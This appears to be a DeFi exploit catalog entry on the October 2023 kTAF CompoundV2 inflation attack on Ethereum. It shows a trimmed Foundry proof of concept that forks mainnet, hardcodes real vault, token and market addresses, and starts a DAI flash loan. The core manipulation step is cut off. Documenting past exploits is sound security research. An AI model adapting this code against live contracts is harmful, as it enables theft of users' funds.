# [?] kTAF - CompoundV2 Inflation Attack

## Summary
Severity: Unknown
Chain: Ethereum
Component: kTAF
Published: 2023-10-19
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-10/kTAF_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$8K
References:
- https://defimon.xyz/attack/mainnet/0x325999373f1aae98db2d89662ff1afbe0c842736f7564d16a7b52bf5c777d3a4

```solidity
contract ContractTest is Test {
    IBalancerVault private constant Vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IERC20 private constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 private constant TAF = IERC20(0xf573E6740045b5387F6d36a26B102C2adF639af5);
    ICErc20Delegate private constant kTAF = ICErc20Delegate(payable(0xf5140fC35C6f94D02d7466f793fEB0216082d7E5));
    ICErc20Immutable private constant kDAI = ICErc20Immutable(0xE5C6c14F466A4F3A73eCEc7F3aAaA15c5EcBc769);
    IComptroller private constant Unitroller = IComptroller(0x959Fb43EF08F415da0AeA39BEEf92D96f41E41b3);
    address private constant borrower = 0x3cF7e9d9dCfeD77f295CF7A7F5539eC407D9a67d;

    function setUp() public {
        vm.createSelectFork("mainnet", 18_385_885);
        vm.label(address(Vault), "Vault");
        vm.label(address(DAI), "DAI");
        vm.label(address(kTAF), "kTAF");
        vm.label(address(kDAI), "kDAI");
        vm.label(address(Unitroller), "Unitroller");
        vm.label(borrower, "borrower");
    }

    function testExploit() public {
        emit log_named_decimal_uint("Attacker DAI balance before exploit", DAI.balanceOf(address(this)), DAI.decimals());

        emit log_named_decimal_uint("Attacker TAF balance before exploit", TAF.balanceOf(address(this)), TAF.decimals());

        address[] memory tokens = new address[](1);
        tokens[0] = address(DAI);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 4000 * 1e18;
        Vault.flashLoan(address(this), tokens, amounts, bytes(""));

        emit log_named_decimal_uint("Attacker DAI balance after exploit", DAI.balanceOf(address(this)), DAI.decimals());

        emit log_named_decimal_uint("Attacker TAF balance after exploit", TAF.balanceOf(address(this)), TAF.decimals());
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-10/kTAF_exp.sol_
